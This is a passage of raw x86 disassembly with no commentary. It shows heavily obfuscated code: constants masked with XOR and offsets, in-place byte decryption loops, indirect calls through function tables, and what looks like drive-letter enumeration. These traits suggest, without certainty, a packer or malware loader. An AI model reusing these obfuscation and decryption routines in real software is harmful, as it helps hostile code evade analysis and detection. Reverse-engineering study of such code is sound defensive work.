  424cff:	call   DWORD PTR [ebp-0x24]
  424d02:	test   eax,eax
  424d04:	je     0x424d48
  424d06:	mov    eax,DWORD PTR [ebp-0x8]
  424d09:	push   0x19
  424d0b:	xor    edx,edx
  424d0d:	pop    ecx
  424d0e:	div    ecx
  424d10:	add    dl,0x41
  424d13:	movzx  eax,dl
  424d16:	push   eax
  424d17:	call   DWORD PTR [ebp-0x44]
  424d1a:	test   eax,eax
  424d1c:	jne    0x424d48
  424d1e:	mov    eax,DWORD PTR [ebp+0x8]
  424d21:	mov    edi,DWORD PTR [eax+0x1e0]
  424d27:	mov    esi,DWORD PTR [ebp+0x8]
  424d2a:	xor    eax,eax
  424d2c:	lea    edx,[ebp-0x68]
  424d2f:	call   0x426ed7
  424d34:	push   eax
  424d35:	mov    eax,DWORD PTR [ebp+0x8]
  424d38:	mov    eax,DWORD PTR [eax+0x198]
  424d3e:	push   DWORD PTR [eax]
  424d40:	call   DWORD PTR [edi+0x8]
  424d43:	mov    DWORD PTR [ebp-0x14],eax
  424d46:	jmp    0x424d4c
  424d48:	and    DWORD PTR [ebp-0x14],0x0
  424d4c:	inc    DWORD PTR [ebp-0x8]
  424d4f:	cmp    DWORD PTR [ebp-0x8],0x10
  424d53:	jb     0x424cf5
  424d55:	mov    eax,DWORD PTR [ebp-0x18]
  424d58:	mov    esi,DWORD PTR [ebp+0x8]
  424d5b:	xor    eax,ebx
  424d5d:	mov    edi,0x3272f6
  424d62:	add    eax,edi
  424d64:	lea    edx,[ebp-0x10c]
  424d6a:	call   0x426ed7
  424d6f:	push   eax
  424d70:	mov    eax,DWORD PTR [ebp-0x10]
  424d73:	mov    esi,DWORD PTR [ebp+0x8]
  424d76:	xor    eax,ebx
  424d78:	add    eax,edi
  424d7a:	lea    edx,[ebp-0x12c]
  424d80:	call   0x426ed7
  424d85:	push   eax
  424d86:	call   DWORD PTR [ebp-0x14]
  424d89:	mov    ecx,DWORD PTR [ebp-0x10]
  424d8c:	xor    ecx,ebx
  424d8e:	add    ecx,edi
  424d90:	cmp    ecx,eax
  424d92:	jne    0x424d9b
  424d94:	mov    DWORD PTR [ebp-0x20],0x1
  424d9b:	mov    eax,DWORD PTR [ebp-0x18]
  424d9e:	mov    ecx,DWORD PTR [ebp-0x1c]
  424da1:	xor    eax,ebx
  424da3:	lea    eax,[eax+ecx*1+0x3272f6]
  424daa:	mov    DWORD PTR [ebp-0x1c],eax
  424dad:	mov    eax,DWORD PTR [ebp-0x20]
  424db0:	test   eax,eax
  424db2:	je     0x424dc6
  424db4:	mov    eax,DWORD PTR [ebp-0x18]
  424db7:	mov    ecx,DWORD PTR [ebp-0x34]
  424dba:	xor    eax,ebx
  424dbc:	lea    eax,[eax+ecx*1+0x3272f6]
  424dc3:	mov    DWORD PTR [ebp-0x34],eax
  424dc6:	mov    eax,DWORD PTR [ebp-0x18]
  424dc9:	xor    eax,ebx
  424dcb:	mov    ecx,0xffcd8d0a
  424dd0:	sub    ecx,eax
  424dd2:	add    ecx,DWORD PTR [ebp-0x28]
  424dd5:	mov    eax,DWORD PTR [ebp-0x1c]
  424dd8:	cmp    eax,ecx
  424dda:	jbe    0x424c3f
  424de0:	mov    esi,edi
  424de2:	mov    eax,DWORD PTR [ebp-0x34]
  424de5:	mov    ecx,DWORD PTR [ebp-0x1c]
  424de8:	cmp    ecx,eax
  424dea:	jne    0x424dfd
  424dec:	push   DWORD PTR [ebp+0x8]
  424def:	lea    eax,[ebp-0x3c]
  424df2:	push   eax
  424df3:	call   0x427946
  424df8:	mov    DWORD PTR [ebp-0x2c],eax
  424dfb:	jmp    0x424e09
  424dfd:	mov    eax,DWORD PTR [ebp-0x2c]
  424e00:	mov    ecx,DWORD PTR [ebp-0x18]
  424e03:	xor    ecx,ebx
  424e05:	add    ecx,esi
  424e07:	xor    DWORD PTR [eax],ecx
  424e09:	mov    eax,DWORD PTR [ebp-0x10]
  424e0c:	mov    ecx,DWORD PTR [ebp-0x2c]
  424e0f:	xor    eax,ebx
  424e11:	add    eax,esi
  424e13:	cmp    eax,ecx
  424e15:	je     0x42558f
  424e1b:	mov    eax,DWORD PTR [ebp-0x10]
  424e1e:	mov    ecx,DWORD PTR [ebp-0x3c]
  424e21:	xor    eax,ebx
  424e23:	add    eax,esi
  424e25:	cmp    eax,ecx
  424e27:	je     0x42558f
  424e2d:	mov    eax,DWORD PTR [ebp-0x10]
  424e30:	xor    eax,ebx
  424e32:	add    eax,esi
  424e34:	jmp    0x424e52
  424e36:	mov    edi,DWORD PTR [ebp-0x2c]
  424e39:	mov    cl,al
  424e3b:	and    cl,0x1f
  424e3e:	or     dl,0xff
  424e41:	sub    dl,cl
  424e43:	add    BYTE PTR [edi+eax*1],dl
  424e46:	mov    ecx,DWORD PTR [ebp-0x18]
  424e49:	xor    ecx,ebx
  424e4b:	lea    eax,[eax+ecx*1+0x3272f6]
  424e52:	mov    ecx,DWORD PTR [ebp-0x3c]
  424e55:	cmp    eax,ecx
  424e57:	jb     0x424e36
  424e59:	mov    eax,DWORD PTR [ebp-0x3c]
  424e5c:	mov    DWORD PTR [ebp-0x28],eax
  424e5f:	mov    eax,DWORD PTR [ebp-0x2c]
  424e62:	mov    DWORD PTR [ebp-0x34],0xf89c85a5
  424e69:	mov    DWORD PTR [ebp-0xd4],eax
  424e6f:	mov    edi,0xf89c85a4
  424e74:	mov    DWORD PTR [ebp-0x30],edi
  424e77:	mov    eax,DWORD PTR [ebp-0x34]
  424e7a:	xor    eax,ebx
  424e7c:	add    eax,esi
  424e7e:	mov    DWORD PTR [ebp-0xc],eax
  424e81:	mov    eax,DWORD PTR [ebp-0x34]
  424e84:	xor    eax,ebx
  424e86:	add    eax,esi
  424e88:	mov    DWORD PTR [ebp-0x8],eax
  424e8b:	mov    DWORD PTR [ebp-0x44],0xf89c8585
  424e92:	mov    DWORD PTR [ebp-0x4c],0xf89c85be
  424e99:	mov    eax,DWORD PTR [ebp-0x34]
  424e9c:	mov    ecx,DWORD PTR [ebp-0x28]
  424e9f:	xor    eax,ebx
  424ea1:	add    eax,esi
  424ea3:	cmp    ecx,eax
  424ea5:	je     0x4250a4
  424eab:	jmp    0x425080
  424eb0:	mov    ecx,DWORD PTR [ebp-0xc]
  424eb3:	mov    eax,DWORD PTR [ebp-0x28]
  424eb6:	sub    eax,ecx
  424eb8:	mov    ecx,DWORD PTR [ebp-0x44]
  424ebb:	xor    ecx,ebx
  424ebd:	add    ecx,esi
  424ebf:	xor    edx,edx
  424ec1:	div    ecx
  424ec3:	mov    DWORD PTR [ebp-0x8],eax
  424ec6:	mov    eax,DWORD PTR [ebp-0x4c]
  424ec9:	mov    ecx,DWORD PTR [ebp-0x8]
  424ecc:	xor    eax,ebx
  424ece:	add    eax,esi
  424ed0:	cmp    ecx,eax
  424ed2:	jbe    0x424ede
  424ed4:	mov    eax,DWORD PTR [ebp-0x4c]
  424ed7:	xor    eax,ebx
  424ed9:	add    eax,esi
  424edb:	mov    DWORD PTR [ebp-0x8],eax
  424ede:	mov    eax,DWORD PTR [ebp-0x44]
  424ee1:	mov    ecx,DWORD PTR [ebp-0x8]
  424ee4:	xor    eax,ebx
  424ee6:	add    eax,esi
  424ee8:	imul   eax,ecx
  424eeb:	mov    DWORD PTR [ebp-0x8],eax
  424eee:	mov    eax,DWORD PTR [ebp-0x34]
  424ef1:	mov    ecx,DWORD PTR [ebp-0x8]
  424ef4:	xor    eax,ebx
  424ef6:	add    eax,esi
  424ef8:	cmp    ecx,eax
  424efa:	je     0x42506e
  424f00:	mov    eax,DWORD PTR [ebp-0x8]
  424f03:	mov    DWORD PTR [ebp-0x14],eax
  424f06:	mov    eax,DWORD PTR [ebp-0xc]
  424f09:	add    eax,DWORD PTR [ebp-0xd4]
  424f0f:	mov    DWORD PTR [ebp-0x24],0xf89c85a5
  424f16:	mov    DWORD PTR [ebp-0x20],edi
  424f19:	mov    DWORD PTR [ebp-0xe8],0xf89c85a3
  424f23:	mov    DWORD PTR [ebp-0x8],eax
  424f26:	mov    DWORD PTR [ebp-0x38],0xf89c85a2
  424f2d:	mov    DWORD PTR [ebp-0x1c],edi
  424f30:	mov    eax,DWORD PTR [ebp-0x24]
  424f33:	xor    eax,ebx
  424f35:	add    eax,esi
  424f37:	jmp    0x42502d
  424f3c:	mov    DWORD PTR [ebp-0xe0],0xf89c85ba
  424f46:	mov    DWORD PTR [ebp-0xc4],0xf89c858f
  424f50:	mov    eax,DWORD PTR [ebp-0x1c]
  424f53:	mov    ecx,DWORD PTR [ebp-0x48]
  424f56:	xor    eax,ebx
  424f58:	add    eax,esi
  424f5a:	imul   eax,ecx
  424f5d:	mov    ecx,DWORD PTR [ebp-0x8]
  424f60:	mov    al,BYTE PTR [eax+ecx*1]
  424f63:	mov    BYTE PTR [ebp-0x2],al
  424f66:	mov    eax,DWORD PTR [ebp-0x1c]
  424f69:	mov    ecx,DWORD PTR [ebp-0x48]
  424f6c:	xor    eax,ebx
  424f6e:	add    eax,esi
  424f70:	imul   eax,ecx
  424f73:	mov    ecx,DWORD PTR [ebp-0xe8]
  424f79:	xor    ecx,ebx
  424f7b:	add    eax,ecx
  424f7d:	mov    ecx,DWORD PTR [ebp-0x8]
  424f80:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f6]
  424f88:	mov    ecx,DWORD PTR [ebp-0xe0]
  424f8e:	xor    ecx,ebx
  424f90:	lea    eax,[ecx+eax*1+0x3272f6]
  424f97:	movzx  ecx,BYTE PTR [ebp-0x2]
  424f9b:	xor    ecx,eax
  424f9d:	mov    BYTE PTR [ebp-0x2],cl
  424fa0:	mov    al,BYTE PTR [ebp-0x2]
  424fa3:	mov    ecx,DWORD PTR [ebp-0x1c]
  424fa6:	mov    edx,DWORD PTR [ebp-0x48]
  424fa9:	xor    ecx,ebx
  424fab:	add    ecx,esi
  424fad:	imul   ecx,edx
  424fb0:	mov    edx,DWORD PTR [ebp-0x8]
  424fb3:	mov    BYTE PTR [ecx+edx*1],al
  424fb6:	mov    eax,DWORD PTR [ebp-0x1c]
  424fb9:	mov    ecx,DWORD PTR [ebp-0x48]
  424fbc:	xor    eax,ebx
  424fbe:	add    eax,esi
  424fc0:	imul   eax,ecx
  424fc3:	mov    ecx,DWORD PTR [ebp-0x8]
  424fc6:	mov    al,BYTE PTR [eax+ecx*1]
  424fc9:	mov    BYTE PTR [ebp-0x2],al
  424fcc:	mov    eax,DWORD PTR [ebp-0x1c]
  424fcf:	mov    ecx,DWORD PTR [ebp-0x48]
  424fd2:	xor    eax,ebx
  424fd4:	add    eax,esi
  424fd6:	imul   eax,ecx
  424fd9:	mov    ecx,DWORD PTR [ebp-0x20]
  424fdc:	xor    ecx,ebx
  424fde:	add    eax,ecx
  424fe0:	mov    ecx,DWORD PTR [ebp-0x8]
  424fe3:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f6]
  424feb:	mov    ecx,DWORD PTR [ebp-0xc4]
  424ff1:	xor    ecx,ebx
  424ff3:	lea    eax,[ecx+eax*1+0x3272f6]
  424ffa:	movzx  ecx,BYTE PTR [ebp-0x2]
  424ffe:	xor    ecx,eax
  425000:	mov    BYTE PTR [ebp-0x2],cl
  425003:	mov    al,BYTE PTR [ebp-0x2]
  425006:	mov    ecx,DWORD PTR [ebp-0x1c]
  425009:	mov    edx,DWORD PTR [ebp-0x48]
  42500c:	xor    ecx,ebx
  42500e:	add    ecx,esi
  425010:	imul   ecx,edx
  425013:	mov    edx,DWORD PTR [ebp-0x8]
  425016:	mov    BYTE PTR [ecx+edx*1],al
  425019:	mov    eax,DWORD PTR [ebp-0x38]
  42501c:	mov    ecx,DWORD PTR [ebp-0x20]
  42501f:	xor    eax,ebx
  425021:	xor    ecx,ebx
  425023:	add    eax,esi
  425025:	add    ecx,esi
  425027:	imul   eax,ecx
  42502a:	add    eax,DWORD PTR [ebp-0x48]
  42502d:	mov    DWORD PTR [ebp-0x48],eax
  425030:	mov    eax,DWORD PTR [ebp-0x48]
  425033:	mov    ecx,DWORD PTR [ebp-0x14]
  425036:	cmp    ecx,eax
  425038:	jb     0x424f3c
  42503e:	mov    eax,DWORD PTR [ebp-0x20]
  425041:	mov    ecx,DWORD PTR [ebp-0x14]
  425044:	xor    eax,ebx
  425046:	add    eax,esi
  425048:	imul   eax,ecx
  42504b:	mov    ecx,DWORD PTR [ebp-0x24]
  42504e:	xor    ecx,ebx
  425050:	add    ecx,esi
  425052:	or     eax,ecx
  425054:	mov    ecx,DWORD PTR [ebp-0x30]
  425057:	xor    ecx,ebx
  425059:	add    eax,ecx
  42505b:	mov    ecx,DWORD PTR [ebp-0x30]
  42505e:	xor    ecx,ebx
  425060:	add    eax,ecx
  425062:	mov    ecx,DWORD PTR [ebp-0xc]
  425065:	lea    eax,[eax+ecx*1+0x64e5ec]
  42506c:	jmp    0x42507d
  42506e:	mov    eax,DWORD PTR [ebp-0x30]
  425071:	mov    ecx,DWORD PTR [ebp-0xc]
  425074:	xor    eax,ebx
  425076:	lea    eax,[eax+ecx*1+0x3272f6]
  42507d:	mov    DWORD PTR [ebp-0xc],eax
  425080:	mov    eax,DWORD PTR [ebp-0x30]
  425083:	xor    eax,ebx
  425085:	mov    ecx,0xffcd8d0a
  42508a:	sub    ecx,eax
  42508c:	add    ecx,DWORD PTR [ebp-0x28]
  42508f:	mov    eax,DWORD PTR [ebp-0x30]
  425092:	mov    edx,DWORD PTR [ebp-0xc]
  425095:	xor    eax,ebx
  425097:	add    eax,esi
  425099:	imul   eax,edx
  42509c:	cmp    eax,ecx
  42509e:	jbe    0x424eb0
  4250a4:	mov    eax,DWORD PTR [ebp-0x10]
  4250a7:	mov    ecx,DWORD PTR [ebp-0x3c]
  4250aa:	mov    eax,DWORD PTR [ebp+0x8]
  4250ad:	mov    edx,DWORD PTR [ebp-0x54]
  4250b0:	mov    eax,DWORD PTR [eax+0x1e0]
  4250b6:	xor    edx,ebx
  4250b8:	add    edx,esi
  4250ba:	push   edx
  4250bb:	mov    edx,DWORD PTR [ebp-0x40]
  4250be:	xor    edx,ebx
  4250c0:	add    edx,esi
  4250c2:	push   edx
  4250c3:	push   ecx
  4250c4:	mov    DWORD PTR [ebp-0x38],ecx
  4250c7:	mov    ecx,DWORD PTR [ebp-0x10]
  4250ca:	xor    ecx,ebx
  4250cc:	add    ecx,esi
  4250ce:	push   ecx
  4250cf:	call   DWORD PTR [eax+0x14]
  4250d2:	mov    edi,eax
  4250d4:	mov    eax,DWORD PTR [ebp-0x10]
  4250d7:	xor    eax,ebx
  4250d9:	add    eax,esi
  4250db:	cmp    eax,edi
  4250dd:	je     0x425138
  4250df:	mov    eax,DWORD PTR [ebp-0x10]
  4250e2:	jmp    0x425105
  4250e4:	mov    ecx,DWORD PTR [ebp-0x2c]
  4250e7:	xor    eax,ebx
  4250e9:	mov    cl,BYTE PTR [ecx+eax*1+0x3272f6]
  4250f0:	mov    BYTE PTR [eax+edi*1+0x3272f6],cl
  4250f7:	mov    ecx,DWORD PTR [ebp-0x18]
  4250fa:	xor    ecx,ebx
  4250fc:	lea    eax,[ecx+eax*1+0x3272f6]
  425103:	xor    eax,ebx
  425105:	mov    ecx,DWORD PTR [ebp-0x3c]
  425108:	sub    ecx,esi
  42510a:	xor    ecx,ebx
  42510c:	cmp    eax,ecx
  42510e:	jne    0x4250e4
  425110:	mov    eax,DWORD PTR [ebp+0x8]
  425113:	mov    ecx,DWORD PTR [ebp-0x50]
  425116:	mov    eax,DWORD PTR [eax+0x1e0]
  42511c:	xor    ecx,ebx
  42511e:	add    ecx,esi
  425120:	push   ecx
  425121:	mov    ecx,DWORD PTR [ebp-0x10]
  425124:	xor    ecx,ebx
  425126:	add    ecx,esi
  425128:	push   ecx
  425129:	push   DWORD PTR [ebp-0x2c]
  42512c:	call   DWORD PTR [eax+0x18]
  42512f:	mov    eax,DWORD PTR [ebp-0x38]
  425132:	mov    DWORD PTR [ebp-0x2c],edi
  425135:	mov    DWORD PTR [ebp-0x3c],eax
  425138:	mov    eax,DWORD PTR [ebp-0x2c]
  42513b:	mov    DWORD PTR [ebp-0x14],eax
  42513e:	mov    eax,DWORD PTR [ebp-0x18]
  425141:	mov    ecx,DWORD PTR [ebp-0x10]
  425144:	xor    eax,ebx
  425146:	add    eax,esi
  425148:	mov    DWORD PTR [ebp-0x5c],0x422b332b
  42514f:	mov    DWORD PTR [ebp-0x58],0x382b402b
  425156:	jmp    0x425189
  425158:	mov    edx,DWORD PTR [ebp-0x14]
  42515b:	mov    edi,ecx
  42515d:	xor    edi,ebx
  42515f:	mov    cl,BYTE PTR [ebp+edi*1+0x32729a]
  425166:	movsx  edx,BYTE PTR [edi+edx*1+0x3272f6]
  42516e:	xor    cl,0x7f
  425171:	add    cl,0x4
  425174:	movzx  ecx,cl
  425177:	cmp    edx,ecx
  425179:	jne    0x425193
  42517b:	mov    ecx,DWORD PTR [ebp-0x18]
  42517e:	xor    ecx,ebx
  425180:	lea    ecx,[ecx+edi*1+0x3272f6]
  425187:	xor    ecx,ebx
  425189:	cmp    ecx,0xf89c85bd
  42518f:	jne    0x425158
  425191:	jmp    0x42519a
  425193:	mov    eax,DWORD PTR [ebp-0x10]
  425196:	xor    eax,ebx
  425198:	add    eax,esi
  42519a:	mov    ecx,DWORD PTR [ebp-0x10]
  42519d:	xor    ecx,ebx
  42519f:	add    ecx,esi
  4251a1:	cmp    ecx,eax
  4251a3:	je     0x425319
  4251a9:	mov    eax,DWORD PTR [ebp-0x14]
  4251ac:	mov    eax,DWORD PTR [eax+0x8]
  4251af:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  4251b6:	mov    DWORD PTR [ebp-0x40],0xf89cc3d6
  4251bd:	mov    DWORD PTR [ebp-0x44],0xf89cb5a5
  4251c4:	mov    DWORD PTR [ebp-0x24],0xf89c85a1
  4251cb:	mov    DWORD PTR [ebp-0x20],eax
  4251ce:	mov    eax,DWORD PTR [ebp+0x8]
  4251d1:	mov    ecx,DWORD PTR [ebp-0x24]
  4251d4:	xor    ecx,ebx
  4251d6:	add    ecx,esi
  4251d8:	push   ecx
  4251d9:	mov    ecx,DWORD PTR [ebp-0x44]
  4251dc:	mov    eax,DWORD PTR [eax+0x1e0]
  4251e2:	xor    ecx,ebx
  4251e4:	add    ecx,esi
  4251e6:	push   ecx
  4251e7:	mov    ecx,DWORD PTR [ebp-0x40]
  4251ea:	xor    ecx,ebx
  4251ec:	add    ecx,esi
  4251ee:	push   ecx
  4251ef:	mov    ecx,DWORD PTR [ebp-0xc]
  4251f2:	xor    ecx,ebx
  4251f4:	add    ecx,esi
  4251f6:	push   ecx
  4251f7:	call   DWORD PTR [eax+0x14]
  4251fa:	mov    edi,eax
  4251fc:	mov    eax,DWORD PTR [ebp+0x8]
  4251ff:	mov    ecx,DWORD PTR [ebp-0x24]
  425202:	mov    eax,DWORD PTR [eax+0x1e0]
  425208:	xor    ecx,ebx
  42520a:	add    ecx,esi
  42520c:	push   ecx
  42520d:	mov    ecx,DWORD PTR [ebp-0x44]
  425210:	xor    ecx,ebx
  425212:	add    ecx,esi
  425214:	push   ecx
  425215:	mov    ecx,DWORD PTR [ebp-0xc]
  425218:	push   DWORD PTR [ebp-0x20]
  42521b:	xor    ecx,ebx
  42521d:	add    ecx,esi
  42521f:	push   ecx
  425220:	call   DWORD PTR [eax+0x14]
  425223:	mov    ecx,DWORD PTR [ebp-0xc]
  425226:	xor    ecx,ebx
  425228:	add    ecx,esi
  42522a:	mov    DWORD PTR [ebp-0x24],eax
  42522d:	cmp    ecx,edi
  42522f:	je     0x4255bc
  425235:	mov    ecx,DWORD PTR [ebp-0xc]
  425238:	xor    ecx,ebx
  42523a:	add    ecx,esi
  42523c:	cmp    ecx,eax
  42523e:	je     0x4255bc
  425244:	mov    DWORD PTR [ebp-0x40],0xf89c85a2
  42524b:	mov    DWORD PTR [ebp-0x54],0xf89c85a3
  425252:	mov    ecx,DWORD PTR [ebp-0x40]
  425255:	xor    cl,0xaf
  425258:	sub    cl,0xa
  42525b:	mov    BYTE PTR [edi],cl
  42525d:	mov    ecx,DWORD PTR [ebp-0xc]
  425260:	xor    cl,0xaf
  425263:	sub    cl,0xa
  425266:	mov    BYTE PTR [edi+0x1],cl
  425269:	mov    ecx,DWORD PTR [ebp-0x54]
  42526c:	xor    cl,0xaf
  42526f:	sub    cl,0xa
  425272:	mov    BYTE PTR [edi+0x2],cl
  425275:	and    DWORD PTR [ebp-0xc8],0x0
  42527c:	and    DWORD PTR [ebp-0xdc],0x0
  425283:	lea    ecx,[ebp-0xdc]
  425289:	push   ecx
  42528a:	push   DWORD PTR [ebp-0x20]
  42528d:	push   eax
  42528e:	lea    eax,[ebp-0xc8]
  425294:	push   eax
  425295:	mov    eax,DWORD PTR [ebp-0x14]
  425298:	push   DWORD PTR [eax+0xc]
  42529b:	mov    eax,DWORD PTR [ebp-0x2c]
  42529e:	add    eax,0x10
  4252a1:	push   eax
  4252a2:	push   edi
  4252a3:	call   0x424547
  4252a8:	mov    DWORD PTR [ebp-0x40],eax
  4252ab:	mov    eax,DWORD PTR [ebp+0x8]
  4252ae:	mov    ecx,DWORD PTR [ebp-0x50]
  4252b1:	mov    eax,DWORD PTR [eax+0x1e0]
  4252b7:	xor    ecx,ebx
  4252b9:	add    ecx,esi
  4252bb:	push   ecx
  4252bc:	mov    ecx,DWORD PTR [ebp-0xc]
  4252bf:	xor    ecx,ebx
  4252c1:	add    ecx,esi
  4252c3:	push   ecx
  4252c4:	push   edi
  4252c5:	call   DWORD PTR [eax+0x18]
  4252c8:	mov    eax,DWORD PTR [ebp-0x40]
  4252cb:	add    eax,0xffcd8d0a
  4252d0:	xor    eax,ebx
  4252d2:	cmp    eax,0xf89c85a5
  4252d7:	mov    eax,DWORD PTR [ebp+0x8]
  4252da:	mov    eax,DWORD PTR [eax+0x1e0]
  4252e0:	mov    ecx,DWORD PTR [ebp-0x50]
  4252e3:	jne    0x425306
  4252e5:	xor    ecx,ebx
  4252e7:	add    ecx,esi
  4252e9:	push   ecx
  4252ea:	mov    ecx,DWORD PTR [ebp-0xc]
  4252ed:	xor    ecx,ebx
  4252ef:	add    ecx,esi
  4252f1:	push   ecx
  4252f2:	push   DWORD PTR [ebp-0x2c]
  4252f5:	call   DWORD PTR [eax+0x18]
  4252f8:	mov    eax,DWORD PTR [ebp-0x24]
  4252fb:	mov    DWORD PTR [ebp-0x2c],eax
  4252fe:	mov    eax,DWORD PTR [ebp-0x20]
  425301:	mov    DWORD PTR [ebp-0x3c],eax
  425304:	jmp    0x425319
  425306:	xor    ecx,ebx
  425308:	add    ecx,esi
  42530a:	push   ecx
  42530b:	mov    ecx,DWORD PTR [ebp-0xc]
  42530e:	xor    ecx,ebx
  425310:	add    ecx,esi
  425312:	push   ecx
  425313:	push   DWORD PTR [ebp-0x24]
  425316:	call   DWORD PTR [eax+0x18]
  425319:	mov    eax,DWORD PTR [ebp-0x3c]
  42531c:	mov    DWORD PTR [ebp-0x34],eax
  42531f:	mov    eax,DWORD PTR [ebp-0x2c]
  425322:	mov    DWORD PTR [ebp-0x28],0xf89c85a5
  425329:	mov    DWORD PTR [ebp-0x40],eax
  42532c:	mov    edi,0xf89c85a4
  425331:	mov    DWORD PTR [ebp-0x30],edi
  425334:	mov    eax,DWORD PTR [ebp-0x28]
  425337:	xor    eax,ebx
  425339:	add    eax,esi
  42533b:	mov    DWORD PTR [ebp-0xc],eax
  42533e:	mov    eax,DWORD PTR [ebp-0x28]
  425341:	xor    eax,ebx
  425343:	add    eax,esi
  425345:	mov    DWORD PTR [ebp-0x14],eax
  425348:	mov    DWORD PTR [ebp-0x44],0xf89c8585
  42534f:	mov    DWORD PTR [ebp-0x24],0xf89c85be
  425356:	mov    eax,DWORD PTR [ebp-0x28]
  425359:	mov    ecx,DWORD PTR [ebp-0x34]
  42535c:	xor    eax,ebx
  42535e:	add    eax,esi
  425360:	cmp    ecx,eax
  425362:	je     0x425558
  425368:	jmp    0x425534
  42536d:	mov    ecx,DWORD PTR [ebp-0xc]
  425370:	mov    eax,DWORD PTR [ebp-0x34]
  425373:	sub    eax,ecx
  425375:	mov    ecx,DWORD PTR [ebp-0x44]
  425378:	xor    ecx,ebx
  42537a:	add    ecx,esi
  42537c:	xor    edx,edx
  42537e:	div    ecx
  425380:	mov    DWORD PTR [ebp-0x14],eax
  425383:	mov    eax,DWORD PTR [ebp-0x24]
  425386:	mov    ecx,DWORD PTR [ebp-0x14]
  425389:	xor    eax,ebx
  42538b:	add    eax,esi
  42538d:	cmp    ecx,eax
  42538f:	jbe    0x42539b
  425391:	mov    eax,DWORD PTR [ebp-0x24]
  425394:	xor    eax,ebx
  425396:	add    eax,esi
  425398:	mov    DWORD PTR [ebp-0x14],eax
  42539b:	mov    eax,DWORD PTR [ebp-0x44]
  42539e:	mov    ecx,DWORD PTR [ebp-0x14]
  4253a1:	xor    eax,ebx
  4253a3:	add    eax,esi
  4253a5:	imul   eax,ecx
  4253a8:	mov    DWORD PTR [ebp-0x14],eax
  4253ab:	mov    eax,DWORD PTR [ebp-0x28]
  4253ae:	mov    ecx,DWORD PTR [ebp-0x14]
  4253b1:	xor    eax,ebx
  4253b3:	add    eax,esi
  4253b5:	cmp    ecx,eax
  4253b7:	je     0x425522
  4253bd:	mov    eax,DWORD PTR [ebp-0x14]
  4253c0:	mov    DWORD PTR [ebp-0x20],eax
  4253c3:	mov    eax,DWORD PTR [ebp-0xc]
  4253c6:	add    eax,DWORD PTR [ebp-0x40]
  4253c9:	mov    DWORD PTR [ebp-0x4c],0xf89c85a5
  4253d0:	mov    DWORD PTR [ebp-0x14],edi
  4253d3:	mov    DWORD PTR [ebp-0x54],0xf89c85a3
  4253da:	mov    DWORD PTR [ebp-0x1c],eax
  4253dd:	mov    DWORD PTR [ebp-0x38],0xf89c85a2
  4253e4:	mov    DWORD PTR [ebp-0x8],edi
  4253e7:	mov    eax,DWORD PTR [ebp-0x4c]
  4253ea:	xor    eax,ebx
  4253ec:	add    eax,esi
  4253ee:	jmp    0x4254e1
  4253f3:	mov    DWORD PTR [ebp-0xe4],0xf89c85ba
  4253fd:	mov    DWORD PTR [ebp-0xd0],0xf89c858f
  425407:	mov    eax,DWORD PTR [ebp-0x8]
  42540a:	mov    ecx,DWORD PTR [ebp-0x18]
  42540d:	xor    eax,ebx
  42540f:	add    eax,esi
  425411:	imul   eax,ecx
  425414:	mov    ecx,DWORD PTR [ebp-0x1c]
  425417:	mov    al,BYTE PTR [eax+ecx*1]
  42541a:	mov    BYTE PTR [ebp-0x1],al
  42541d:	mov    eax,DWORD PTR [ebp-0x8]
  425420:	mov    ecx,DWORD PTR [ebp-0x18]
  425423:	xor    eax,ebx
  425425:	add    eax,esi
  425427:	imul   eax,ecx
  42542a:	mov    ecx,DWORD PTR [ebp-0x54]
  42542d:	xor    ecx,ebx
  42542f:	add    eax,ecx
  425431:	mov    ecx,DWORD PTR [ebp-0x1c]
  425434:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f6]
  42543c:	mov    ecx,DWORD PTR [ebp-0xe4]
  425442:	xor    ecx,ebx
  425444:	lea    eax,[ecx+eax*1+0x3272f6]
  42544b:	movzx  ecx,BYTE PTR [ebp-0x1]
  42544f:	xor    ecx,eax
  425451:	mov    BYTE PTR [ebp-0x1],cl
  425454:	mov    al,BYTE PTR [ebp-0x1]
  425457:	mov    ecx,DWORD PTR [ebp-0x8]
  42545a:	mov    edx,DWORD PTR [ebp-0x18]
  42545d:	xor    ecx,ebx
  42545f:	add    ecx,esi
  425461:	imul   ecx,edx
  425464:	mov    edx,DWORD PTR [ebp-0x1c]
  425467:	mov    BYTE PTR [ecx+edx*1],al
  42546a:	mov    eax,DWORD PTR [ebp-0x8]
  42546d:	mov    ecx,DWORD PTR [ebp-0x18]
  425470:	xor    eax,ebx
  425472:	add    eax,esi
  425474:	imul   eax,ecx
  425477:	mov    ecx,DWORD PTR [ebp-0x1c]
  42547a:	mov    al,BYTE PTR [eax+ecx*1]
  42547d:	mov    BYTE PTR [ebp-0x1],al
  425480:	mov    eax,DWORD PTR [ebp-0x8]
  425483:	mov    ecx,DWORD PTR [ebp-0x18]
  425486:	xor    eax,ebx
  425488:	add    eax,esi
  42548a:	imul   eax,ecx
  42548d:	mov    ecx,DWORD PTR [ebp-0x14]
  425490:	xor    ecx,ebx
  425492:	add    eax,ecx
  425494:	mov    ecx,DWORD PTR [ebp-0x1c]
  425497:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f6]
  42549f:	mov    ecx,DWORD PTR [ebp-0xd0]
  4254a5:	xor    ecx,ebx
  4254a7:	lea    eax,[ecx+eax*1+0x3272f6]
  4254ae:	movzx  ecx,BYTE PTR [ebp-0x1]
  4254b2:	xor    ecx,eax
  4254b4:	mov    BYTE PTR [ebp-0x1],cl
  4254b7:	mov    al,BYTE PTR [ebp-0x1]
  4254ba:	mov    ecx,DWORD PTR [ebp-0x8]
  4254bd:	mov    edx,DWORD PTR [ebp-0x18]
  4254c0:	xor    ecx,ebx
  4254c2:	add    ecx,esi
  4254c4:	imul   ecx,edx
  4254c7:	mov    edx,DWORD PTR [ebp-0x1c]
  4254ca:	mov    BYTE PTR [ecx+edx*1],al
  4254cd:	mov    eax,DWORD PTR [ebp-0x38]
  4254d0:	mov    ecx,DWORD PTR [ebp-0x14]
  4254d3:	xor    eax,ebx
  4254d5:	xor    ecx,ebx
  4254d7:	add    eax,esi
  4254d9:	add    ecx,esi
  4254db:	imul   eax,ecx
  4254de:	add    eax,DWORD PTR [ebp-0x18]
  4254e1:	mov    DWORD PTR [ebp-0x18],eax
  4254e4:	mov    eax,DWORD PTR [ebp-0x18]
  4254e7:	mov    ecx,DWORD PTR [ebp-0x20]
